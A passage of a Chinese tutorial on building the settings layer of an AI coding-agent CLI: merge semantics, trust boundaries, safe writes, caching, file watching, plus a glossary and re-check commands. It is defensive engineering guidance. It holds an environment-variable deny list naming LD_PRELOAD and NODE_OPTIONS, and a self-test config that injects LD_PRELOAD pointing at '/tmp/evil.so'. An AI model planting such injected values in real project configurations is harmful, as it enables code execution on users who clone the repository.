`rawRead.ts` 不能导入 Zod，否则无法在模块求值早期启动子进程）。

sid-code 的 `settings/` 拆成 11 个文件，理由更多是**职责与依赖方向**：

| 文件 | 行数 | 职责 | 依赖约束 |
| --- | --- | --- | --- |
| `constants.ts` | 68 | 来源定义 + 路径解析 | 只依赖 `path`/`os`/`paths.ts` |
| `types.ts` | 392 | Zod schema | — |
| `cache.ts` | 91 | 三级缓存 | 纯状态容器，不依赖读写逻辑 |
| `merge.ts` | 87 | 合并语义 | **纯函数，零依赖**（不用 lodash） |
| `security.ts` | 60 | 安全敏感字段过滤 | 单一权威清单（§5.3） |
| `validation.ts` | 88 | Zod 错误格式化 + 权限规则预过滤 | — |
| `internal-writes.ts` | 37 | 内部写入标记 | **独立叶子模块，专为打破循环依赖**（§7.5） |
| `change-detector.ts` | 122 | 文件监听 | 依赖 `cache` + `internal-writes` |
| `managed-env.ts` | 139 | env 两阶段应用 | 依赖 `settings` |
| `settings.ts` | 418 | 加载/合并/读取/写入 | 依赖上面大部分 |
| `index.ts` | 52 | 导出面 | — |

**`internal-writes.ts` 只有 37 行、只为打破一个循环依赖而存在**——
这个拆分是可以学的：**当两个模块需要握手时，把握手协议放进第三个叶子模块**，
而不是让其中一方依赖另一方。

### 13.5 一张选型表：你自己设计时该做到哪一档

如果你要为一个新工具设计配置系统，按规模选：

| 你的规模 | 必须做 | 可以省 | 判据 |
| --- | --- | --- | --- |
| **个人工具** | 单文件 + 默认值 + fail-open | 多来源、缓存、变更检测 | 没有第二个用户，就没有优先级问题 |
| **团队工具** | + user/project/local 三源 + 合并语义 + **信任边界** | 企业管控、MDM、feature flag | **信任边界不能省**：只要读项目目录的配置就有攻击面 |
| **企业内部工具** | + policy 层（单文件够）+ 三级缓存 + 变更检测 | MDM、远程下发、feature flag | 有 IT 部门就需要管控层 |
| **公开发布产品** | + 多通道管控 first-source-wins + feature flag + 跨平台 MDM | — | 部署形态数量决定这一档 |

**最重要的一条**：**"信任边界"在第二档就必须做，它不是高级特性。**
只要你的工具会读项目目录里的配置文件，§5.1 那条攻击链就成立。
一个只有 10 个用户的内部工具，同样会有人 clone 外部仓库。

### 13.6 本章自检

- sid-code 与 CC 的规模差异体现在哪五个维度？
- 哪些设计是"一致"的（普适）？哪些是"规模驱动"的？
- 明文凭证运行时检测解决的问题，它的存在前提是什么？
- `updater` 模式 vs 显式文件锁，判据是什么？
- `getFeatureValue_CACHED_MAY_BE_STALE` 这个命名传达了什么契约？普适经验是什么？
- `internal-writes.ts` 只有 37 行，它的存在理由是什么？
- 四档规模里哪一项"不能省"？为什么？

## §15 动手：从零搭一个配置层

这一章是路线图。**五个阶段，每个阶段有一个可运行的产出 + 一个你会亲手撞到的坑。**

为什么要分阶段而不是一次做完：因为**每个阶段的坑只有在上一阶段跑起来之后才会出现**。
一次做完的话，五个坑会同时砸下来，你分不清是哪个引起的。

### 阶段 1：单文件 + 默认值（半小时）

**产出**：能读一个 JSON、缺字段回默认值、字段类型错不崩。

```ts
// config.ts
const DEFAULTS = {
  model: "",
  maxTokens: 32768,
  permissionMode: "default" as const,
};

type Config = typeof DEFAULTS;

export function loadConfig(): { config: Config; warnings: string[] } {
  const warnings: string[] = [];
  let raw: Record<string, unknown> = {};

  const path = join(homedir(), ".myagent", "settings.json");
  if (existsSync(path)) {
    try {
      raw = JSON.parse(readFileSync(path, "utf-8"));
    } catch (e) {
      warnings.push(`配置文件解析失败，已忽略：${e}`);   // ← fail-open
    }
  }

  const config = { ...DEFAULTS };
  for (const key of Object.keys(DEFAULTS) as (keyof Config)[]) {
    if (!(key in raw)) continue;                          // ← 用 in，不是 truthiness
    const value = raw[key];
    if (typeof value !== typeof DEFAULTS[key]) {
      warnings.push(`${key} 类型错误（期望 ${typeof DEFAULTS[key]}），已回退默认值`);
      continue;
    }
    (config as any)[key] = value;
  }
  return { config, warnings };
}
```

**你会撞到的坑**：你会想写 `config.maxTokens = raw.maxTokens || DEFAULTS.maxTokens`。
**这行是错的**——用户写 `0` 的话 `||` 会把它当假值换成默认。
正确写法是 `key in raw` 判存在（§10.3 的第 3 问）。

**自检**：写一个 `{"maxTokens": 0}` 的配置文件，看你的代码是把它当"用户要 0"还是"用户没配"。
两种都可能是对的，但你必须**知道自己选了哪个**。

### 阶段 2：多来源 + 合并（两小时）

**产出**：三个来源（user / project / local）按优先级合并，数组按语义合并。

```ts
const SOURCES = ["userSettings", "projectSettings", "localSettings"] as const;

function sourcePath(source: typeof SOURCES[number], cwd = process.cwd()): string {
  switch (source) {
    case "userSettings":    return join(homedir(), ".myagent", "settings.json");
    case "projectSettings": return join(cwd, ".myagent", "settings.json");
    case "localSettings":   return join(cwd, ".myagent", "settings.local.json");
  }
}

// 深度合并 + 数组拼接（读取语义）
function mergeRead<T extends Record<string, unknown>>(target: T, source: Record<string, unknown>): T {
  const result: Record<string, unknown> = { ...target };
  for (const [key, srcVal] of Object.entries(source)) {
    if (srcVal === undefined) continue;                    // 读取时 undefined = 跳过
    const tgtVal = result[key];
    if (Array.isArray(tgtVal) && Array.isArray(srcVal)) {
      const allStrings = [...tgtVal, ...srcVal].every(v => typeof v === "string");
      result[key] = allStrings
        ? [...new Set([...tgtVal, ...srcVal])]              // 字符串数组：拼接去重
        : [...tgtVal, ...srcVal];                           // 对象数组：拼接不去重
    } else if (isPlainObject(tgtVal) && isPlainObject(srcVal)) {
      result[key] = mergeRead(tgtVal, srcVal);
    } else {
      result[key] = srcVal;
    }
  }
  return result as T;
}

function isPlainObject(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v)
    && Object.getPrototypeOf(v) === Object.prototype;       // ← 别漏这行（§4.5）
}
```

**你会撞到的坑**：你会先写一个 `{...a, ...b}` 的浅合并，然后发现
`{permissions:{deny:[...]}}` 里用户的 deny 规则被项目配置整个替掉了。
**而这个 bug 的症状是"某条安全规则消失"，不报错**（§4.1）。

**自检（必做）**：写一个测试——用户级 deny 一条、项目级 deny 另一条，
断言合并结果**两条都在**。这条测试是整个配置系统里最该有的一条。

### 阶段 3：信任边界（一小时，但这是最重要的一小时）

**产出**：项目级配置的安全敏感字段被过滤；env 分三档处理。

```ts
const SECURITY_SENSITIVE_FIELDS = new Set([
  "permissionMode", "skipPermissions", "allowedTools", "allowedDirectories",
  // 你自己系统里"能关掉某道防线"的每一个字段
]);

function filterProjectSettings(settings: Record<string, unknown>) {
  const filtered = { ...settings };
  const removed: string[] = [];
  for (const field of SECURITY_SENSITIVE_FIELDS) {
    if (field in filtered) { delete filtered[field]; removed.push(field); }
  }
  if (removed.length > 0) {
    log.warn(`项目级配置中的安全敏感字段已忽略：${removed.join(", ")}`);  // ← 要告知
  }
  return filtered;
}

// 只对 projectSettings 过滤（localSettings 是 gitignored，不会跟着仓库来）
const final = source === "projectSettings" ? filterProjectSettings(parsed) : parsed;
```

**env 三档**：

```ts
const SAFE_ENV_VARS = new Set(["EDITOR", "TZ", "LANG", "NO_COLOR", /* ... */]);
const PROTECTED_ENV_VARS = new Set(["PATH", "HOME", "LD_PRELOAD", "NODE_OPTIONS", /* ... */]);

function applyEnv(env: Record<string, string>, allAllowed: boolean) {
  for (const [key, value] of Object.entries(env)) {
    if (PROTECTED_ENV_VARS.has(key)) continue;                 // 铁门：永不生效
    if (!allAllowed && !SAFE_ENV_VARS.has(key)) continue;      // 白名单
    process.env[key] = value;
  }
}
// Phase 1（信任前）：可信来源 allAllowed=true，不可信来源 allAllowed=false
// Phase 2（信任后）：全部 allAllowed=true
```

**你会撞到的坑**：你会想"我的工具是内部用的，不需要这个"。
**这是最危险的想法**。你的用户会 clone 外部仓库——
只要工具读项目目录的配置，攻击链就成立（§5.1）。

**自检（必做）**：造一个含 `{"env":{"LD_PRELOAD":"/tmp/evil.so"}}` 的项目级配置，
启动工具，检查 `process.env.LD_PRELOAD`。**它必须是 undefined。**

### 阶段 4：安全写入 + 缓存（三小时）

**产出**：patch 式写入、三级缓存、`clear` 与 `set(null)` 区分。

```ts
export function patchSettingsFile(source: Source, key: string, value: unknown): void {
  const path = sourcePath(source);
  let raw: Record<string, unknown> = {};

  if (existsSync(path)) {
    try {
      raw = JSON.parse(readFileSync(path, "utf-8"));     // 原始文本，不过 schema
    } catch (e) {
      throw new Error(`配置文件解析失败，已跳过写入以免覆盖：${e}`);  // ← fail-closed
    }
  }

  if (value === undefined) delete raw[key];              // 写入时 undefined = 删除
  else raw[key] = value;

  writeFileSync(path, JSON.stringify(raw, null, 2), { mode: 0o600 });

  clearCachedSource(source);       // ← delete，不是 set(source, null)
  sessionCache = null;
}
```

**你会撞到的坑（两个）**：

**坑一**：你会先写"读出合并后的 settings → 改一个字段 → 写回"。
如果你已经实现了 `${VAR}` 占位符展开或 schema 校验，**这一步就会丢字段/落明文密钥**（§6.1）。

**坑二**：你会用 `setCachedSource(source, null)` 来失效缓存。
症状是**连续执行两次持久化操作，第一次的效果消失**（§7.4）。

**自检（必做，两条）**：
1. 配一个 `{"availableModels":[{"name":"x","api_key":"${MY_KEY}"}]}`，
   执行一次持久化操作，**检查文件里 `api_key` 还在、且仍是 `${MY_KEY}` 形态**。
2. **连续执行两个不同的持久化操作**，检查两个字段都在文件里。
   这条测试专门拦 `set(null)` 那个坑——**只测一次写入永远发现不了**。

### 阶段 5：变更检测（两小时）

**产出**：文件改了自动重载，且不误触发。

```ts
const STABILITY_MS = 1000, DELETION_GRACE_MS = 1700, INTERNAL_WINDOW_MS = 5000;

function watchSettings(files: Map<string, Source>) {
  for (const [filePath, source] of files) {
    const dir = dirname(filePath), name = basename(filePath);
    const watcher = watch(dir, (eventType, changed) => {    // ← 监听目录不是文件
      if (changed !== name) return;
      if (eventType === "rename") handlePossibleDeletion(filePath, source);
      else debounce(filePath, STABILITY_MS, () => {
        if (consumeInternalWrite(filePath, INTERNAL_WINDOW_MS)) return;  // ← 自己写的跳过
        fanOut(source);
      });
    });
    watcher.on("error", () => {});    // 静默：监听失败不该影响主流程
  }
}

function fanOut(source: Source) {
  resetAllCaches();                   // ① 先清缓存
  settingsChanged.emit("change", source);   // ② 再通知（顺序不能反）
}
```

**你会撞到的坑（三个，按撞到的顺序）**：

1. 一次保存触发多次重载 → 加防抖
2. **Vim 保存时配置"消失"一瞬间** → rename 事件加宽限期
3. 你自己的 `/theme` 命令触发一次重载 → 加内部写入标记

第 3 个坑修完后还有一个**隐藏的第四坑**：你会忘记让"消费"标记变成一次性的。
后果是 5 秒窗口内用户手改配置那次真实变更被静默吞掉（§7.5）。

**自检**：在 Vim 里打开配置文件、`:wq` 保存，**观察工具有没有闪一下默认值**。

### 15.6 一个必须做的收尾：死字段自查

五个阶段做完后，做一次 §11.2 的自查。**这不是可选的**——
你在阶段 1 定义的 `DEFAULTS` 里，很可能已经有字段没有消费点了。

```bash
# 对每个 schema 声明的字段跑一遍
for field in $(list_all_config_fields); do
  n=$(rg -c "$field" src/ --glob '!*.test.ts' | wc -l)
  echo "$field: $n"
done
```

**读结果前先做阳性对照**（§11.3 陷阱 C）：
用一个你确定有大量消费点的字段跑同一条命令，确认它不返回零。

### 15.7 阶段与坑的对应表

| 阶段 | 产出 | 主坑 | 症状 | 必做自检 |
| --- | --- | --- | --- | --- |
| 1 | 单文件 + 默认值 | `\|\|` 把 `0` 当没配 | 用户设 0 无效 | 写 `{"maxTokens":0}` 试 |
| 2 | 多源合并 | 浅合并吞掉安全规则 | **某条 deny 静默消失** | 两源各一条 deny，断言都在 |
| 3 | 信任边界 | 觉得"内部工具不需要" | **凭证外泄 / RCE** | 造 `LD_PRELOAD` 配置试 |
| 4 | 安全写入 + 缓存 | round-trip 丢字段；`set(null)` | **密钥消失**；第一个命令失效 | 占位符往返 + 连续两次写入 |
| 5 | 变更检测 | 三个误触发 + 标记不消费 | 闪默认值；真实变更被吞 | Vim `:wq` 观察 |
| 收尾 | 死字段自查 | 零命中的假结论 | 删掉了活字段 | **阳性对照** |

### 15.8 一条关于顺序的建议

**先做阶段 3 和 4（安全边界 + 写入护栏），再做阶段 5（性能/体验）。**

理由：读取慢是可以忍的，而且早期没人会注意；
**写坏配置和凭证外泄是不可逆的**。一个把明文密钥落盘的 bug，
修好之后所有已泄露的密钥都要轮换——这个成本远超"配置读取慢了 50ms"。

**这条判据可以推广**：做基础设施时，**按"错误的不可逆程度"排序，
而不是按"实现难度"或"用户可见度"排序**。

---

## 附录 B · 术语速查（按字母序）

| 英文 | 中文 | 一句话 | 详见 |
| --- | --- | --- | --- |
| AppConfig | 内部应用状态 | 工具自己记的账（启动次数、引导状态）。判据见三问 | §2.2 |
| deep merge | 深度合并 | 嵌套对象逐层合并。要显式定义"什么算可递归对象" | §4.5 |
| dead field | 死字段 | schema 有声明、全仓无读取点 | §11.1 R1 |
| effective config | 生效配置 | 合并完的最终结果 | §3.1 |
| fail-closed | 失败即拒绝 | 拿不准就不放行。判据是**不可逆性** | §8.2 §8.8 |
| fail-fast | 失败即崩掉 | 作用域是**整个进程**，与 fail-closed 不同 | §8.2 |
| fail-open | 失败即放行 | 出错记警告、回默认、其余照常。配置系统的默认策略 | §8.3 |
| fanOut | 扇出通知 | 一次变更通知 N 个订阅者。**先清缓存再通知** | §7.6 |
| first-source-wins | 首源胜出 | 只取第一个有内容的来源。用于策略通道 | §9.2 |
| flagSettings | 命令行设置 | `--settings`。唯一的**内存来源**，无磁盘文件 | §3.3 |
| internal write | 内部写入 | 工具自己写的配置。标记必须**一次性消费** | §7.5 |
| lossy round-trip | 有损往返 | 读→改→写回之后内容变了。**本文最重要的事故源** | §6.1 |
| MDM | 移动设备管理 | 企业推配置的 OS 级通道（plist / 注册表） | §9.3 |
| patch | 补丁写入 | 只改目标键，其余字节不动。有损 round-trip 的解药 | §6.2 |
| passthrough | 透传未知字段 | 向前兼容的关键，也是"拼错不报错"的根源 | §8.7 |
| policy settings | 企业管控设置 | 优先级最高，不受 `--setting-sources` 过滤 | §3.4 §9 |
| PROTECTED_ENV_VARS | 受保护变量 | 任何来源都不能覆盖，**连 policy 也不行** | §5.4 |
| round-trip | 往返 | 读出来→改→写回去 | §6.1 |
| SAFE_ENV_VARS | 安全变量白名单 | 判据：恶意设置也不会致凭证泄露/劫持/代码执行 | §5.4 |
| SETTING_SOURCES | 来源数组 | **数组顺序即优先级** | §3.1 |
| single source of truth | 唯一权威源 | 两份"应该一样"的东西迟早不一样 | §5.3 §10.1 |
| trust boundary | 信任边界 | 划在"内容有没有可能是别人写的"，不是"文件在哪" | §5.2 |
| two-phase apply | 两阶段应用 | 信任前只应用安全的，信任后应用全部 | §5.4 |
| write-through | 写穿 | 写盘同时更新内存缓存 | §2.4 |

## 附录 C · 复算命令

所有数字都要能复算。以下命令在仓库根目录执行。

```bash
# ── 配置模块规模 ──
find packages/core/src/config -name '*.ts' -not -name '*.test.ts' | xargs wc -l | tail -1

# ── 五个来源的定义（数组顺序即优先级）──
sed -n '17,23p' packages/core/src/config/settings/constants.ts

# ── 9 个安全敏感字段 ──
sed -n '33,46p' packages/core/src/config/settings/security.ts

# ── env 双清单（各 17 项，内容零重叠）──
awk '/^const SAFE_ENV_VARS/,/^\]\)/'      packages/core/src/config/settings/managed-env.ts | grep -o '"[A-Z_]*"' | nl
awk '/^const PROTECTED_ENV_VARS/,/^\]\)/' packages/core/src/config/settings/managed-env.ts | grep -o '"[A-Z_]*"' | nl

# ── passthrough 用了多少处（含嵌套 schema）──
grep -c '\.passthrough()' packages/core/src/config/settings/types.ts

# ── settings/ 各文件行数（§13.4 的表）──
wc -l packages/core/src/config/settings/*.ts

# ── 链 A 只读两个文件（验证 §2.3 的结论）──
grep -n 'settings.json\|app.json' packages/core/src/config/config.ts | head -5

# ── 链 B 的全部非定义调用点 ──
rg -n 'getSettings\(' packages/ --glob '!*.test.ts' | grep -v 'export function'

# ── patchSettingsFile vs writeSettingsFile 的调用面对比 ──
rg -c 'patchSettingsFile\(' packages/ --glob '!*.test.ts' | wc -l
rg -c 'writeSettingsFile\(' packages/ --glob '!*.test.ts' | wc -l

# ── 判某字段是否有消费点（§11.2 的唯一判据）──
#    读结果前先用一个已知有消费点的字段做阳性对照！
rg -n '<字段名>' packages/ --glob '!*.test.ts' --glob '!*/tests/*'
rg -n 'availableModels' packages/ --glob '!*.test.ts' | wc -l   # 阳性对照

# ── hook 事件「有无真实触发点」的复测（§11.1 R3 / §11.3 陷阱 D）──
#    ① 枚举总数（32）
awk '/enum HookEventName/,/^}/' packages/core/src/hook/types.ts | grep -cE '^\s+[A-Za-z]+ *='
#    ② 有 fire 方法的（28）——差出的 4 个连方法都没有
grep -oE 'fire[A-Za-z]+Event' packages/core/src/hook/event-handler.ts | sort -u | wc -l
#    ③ 每个方法的**业务**调用方数：必须排除两层转发、且允许 ?. 可选链
#       计数 0 = 只有转发层（无业务调用方）；实测 17 个 >0、11 个 =0，11+4=15
for m in $(grep -oE 'fire[A-Za-z]+Event' packages/core/src/hook/event-handler.ts | sort -u); do
  n=$(rg -n "\.${m}(\?\.)?\(" packages/ --glob '!*.test.ts' --glob '!*/tests/*' \
      | grep -v 'hook/system.ts\|hook/event-handler.ts' | wc -l | tr -d ' ')
  printf "  %-34s %s\n" "$m" "$n"
done

# ── 两个死字段的证据 ──
rg -n 'defaultMode' packages/ --glob '!*.test.ts'
rg -n 'autoInstallExtension' packages/ --glob '!*.test.ts'

# ── 默认值的两个定义点（§10.1）──
grep -n 'debug: true\|debugLevel: "DEBUG"' packages/core/src/config/config.ts
grep -n 'debug: false\|debugLevel: "INFO"' packages/core/src/config/app-config.ts

# ── nonnegative vs positive 的分布（§10.3）──
grep -n 'nonnegative()\|positive()' packages/core/src/config/settings/types.ts
```

**复算纪律**（这四条来自 §11.3 和本仓的通用铁律）：

1. **排除测试文件**。只有测试引用 = 零生产入口，不是消费点。
2. **零命中先做阳性对照**。区分"真的是零"和"我的命令坏了"。
3. **说不出取数源的数字就是自我感觉**。每个数字都要能指到 `file:line`。
4. **行号会漂移**。本文所有 `file:line` 的核验时间是 2026-08-31，
   引用前先复跑，不要直接沿用。

---

## 一页速查

如果你要在面试前 10 分钟扫一遍，只看这一页。

**六个需求，六层复杂度**
多人多层期望 → 多来源+优先级+合并语义 / 工具自己记账 → 双轨制 /
项目目录不可信 → 信任边界 / 运行时会被改 → 缓存+变更检测 /
错了不能挂 → fail-open+校验 / 三条通道 → 通道优先级+键名归一

**优先级（两个维度）**
来源：user < project < local < flag < **policy**（越具体越优先，管控凌驾一切）
通道：文件 < 环境变量 < CLI < 斜杠命令运行时态（越临时越优先）

**判据速查**

| 问题 | 判据 |
| --- | --- |
| Settings 还是 AppConfig | 多来源？管理员会管？用户手写？三否归 AppConfig |
| 数组拼接还是替换 | 它是"约束集合"还是"完整替换值" |
| 读还是写的合并语义 | **读时拼接，写时替换**（否则用户删不掉规则） |
| 哪些字段项目级不能设 | **能关掉某道防线的**（我们 9 个） |
| env 变量哪一档 | 恶意设置也无害→白名单 / 等于代码执行→保护名单 / 其余→信任门 |
| fail-open 还是 fail-closed | **这个操作可逆吗**（不可逆→closed） |
| 该不该 fail-fast | **不修就跑不起来吗**（我们 80+ 字段里只有 2 个） |
| `0` 该不该合法 | **"关闭它"是不是用户应有的选择** |
| 配了是否生效 | **有没有消费点**（排除测试、排除定义点、零命中先阳性对照） |
| 该做到哪一档 | 按规模四档，但**信任边界在第二档就不能省** |

**五个必做测试**
① 两源各一条 deny，断言都在 ② `LD_PRELOAD` 项目级配置必须不生效
③ 占位符往返后仍是 `${VAR}` 形态 ④ **连续两次持久化，两个字段都在**
⑤ Vim `:wq` 不闪默认值

**一句话总纲**
> 配置系统的复杂度不在"读文件"，在于让**"没配" / "配了没生效" / "配了但被覆盖了"**
> 这三种状态在用户视角可区分。
